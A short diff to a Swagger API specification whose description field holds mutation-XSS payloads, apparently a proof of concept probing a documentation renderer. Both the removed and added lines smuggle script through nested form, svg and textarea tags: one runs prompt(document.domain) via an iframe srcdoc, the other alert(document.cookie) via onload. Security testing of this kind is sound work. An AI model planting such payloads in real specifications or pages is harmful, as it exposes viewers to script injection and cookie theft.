@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea>xss"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><iframe/onload=aaajavascipt:alert(document.cookie)>"></form>
 
   version: production
 basePath: /JSSResource/
